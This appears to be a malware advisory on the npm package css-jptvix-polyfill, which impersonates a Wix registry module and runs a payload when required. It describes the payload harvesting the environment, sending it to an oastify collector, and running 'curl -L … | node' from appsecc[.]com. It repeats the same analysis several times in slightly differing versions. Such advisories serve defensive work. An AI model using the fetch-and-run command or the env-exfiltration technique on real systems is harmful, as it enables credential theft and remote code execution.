details: The package ships a hidden payload in package/thunderboltRegistry.js that executes as soon as the module is required. It first removes its own entry from require.cache to avoid later inspection, then shells out to collect host reconnaissance — `id`, `id -un`/`whoami`, the full `env` output, and `ifconfig`/`ip addr` — and sends each result as an HTTP GET to hxxps://orj3tao0ic8oj24h9njymexmtdz5ztphe[.]oastify[.]com/ with the victim hostname appended as a `site=` parameter. It then runs `curl -L hxxps://appsecc[.]com/js | node`, fetching and executing a second-stage script from appsecc[.]com, and finally beacons the Node version, platform and PID to the same endpoint with `beacon=rce-poc`. The rest of the file is a Proxy-based stub factory that exports thunderboltRegistry/siteAssetsRegistry/corvidRegistry and similar names, cloning the surface of Wix's Thunderbolt registry shim (registry-manifest.min.json references static[.]parastorage[.]com/unpkg/...) so the module appears to be a legitimate registry polyfill; index.js is an empty module and package.json declares no install hooks, so the payload fires on require of the bundled file. The package name is a combosquat of the real css-polyfill name with an inserted segment, and the declared "CSS polyfill utility" purpose is cover for the exfiltration and remote code execution. css-jptvix-polyfill@1.0.0 ships a trojanized copy of the Wix `thunderboltRegistry` module with a self-executing payload injected at the top of package/thunderboltRegistry.js. On require, the payload removes itself from require.cache, then uses child_process.execSync to run `id`, `id -un`/`whoami`, `env` and `ifconfig`/`ip addr`, and sends each result — including the installer's complete environment (all tokens and secrets in the shell) — to the attacker collector at hxxps://orj3tao0ic8oj24h9njymexmtdz5ztphe[.]oastify[.]com/ via fetch(), tagged with the victim's hostname. It then executes a remote second stage with `curl -L hxxps://appsecc[.]com/js | node`, and finally beacons the Node version, platform, PID and timestamp (beacon=rce-poc). The package's index.js is an empty stub, so the payload fires only when the registry module is imported. Network indicators: orj3tao0ic8oj24h9njymexmtdz5ztphe[.]oastify[.]com (HTTPS/443, exfiltration), appsecc[.]com (HTTPS/443, second-stage payload at /js). css-jptvix-polyfill@1.0.0 ships a hidden reconnaissance and remote-code-execution payload in thunderboltRegistry.js. The file is not referenced by the package's main entry point (index.js is an empty module.exports), so it runs only when the file is required directly, and it first deletes its own entry from require.cache to avoid re-execution and complicate inspection. It then collects host data by shelling out with child_process.execSync: `id`, `id -un`/`whoami`, the complete process environment (`env`, i.e. every environment variable including any tokens or credentials present), and network configuration (`ifconfig`/`ip addr`). Each result is sent as a query string to the attacker's out-of-band collection endpoint hxxps://orj3tao0ic8oj24h9njymexmtdz5ztphe[.]oastify[.]com/ together with the victim hostname, followed by a beacon carrying the Node version, platform and PID. It also executes `curl -L hxxps://appsecc[.]com/js | node`, downloading and running a second-stage script from appsecc[.]com to establish a reverse shell, and reports the command output back to the same endpoint. The remainder of the file is a stub Proxy factory exporting fake registry modules (thunderboltRegistry, siteAssetsRegistry, documentManagementRegistry and similar) to make the package look like a legitimate component registry shim. css-jptvix-polyfill@1.0.0 ships a payload in thunderboltRegistry.js that executes when the module is loaded (index.js is an empty stub; there are no lifecycle hooks). The payload first deletes its own entry from require.cache to hinder inspection, then uses child_process.execSync to run `id`, `id -un`/`whoami`, `env`, and `ifconfig`/`ip addr`, and exfiltrates each command's output over HTTP GET to hxxps://orj3tao0ic8oj24h9njymexmtdz5ztphe[.]oastify[.]com/, appending the victim hostname as a `site` parameter. It also fetches and executes a second-stage payload with `curl -L hxxps://appsecc[.]com/js | node`, and beacons the Node version, platform, and PID. The package name and its bundled registry-manifest.min.json impersonate Wix/Corvid internal registry modules (thunderboltRegistry, siteAssetsRegistry, documentManagementRegistry, editorRegistry, corvidRegistry, autoCompleteRegistry, thunderboltBuilderRegistry, thunderboltPreviewRegistry) with URLs pointing at static[.]parastorage[.]com/unpkg, indicating a dependency-confusion/impersonation lure. IOCs: C2/exfil host orj3tao0ic8oj24h9njymexmtdz5ztphe[.]oastify[.]com; second-stage host appsecc[.]com (path /js).
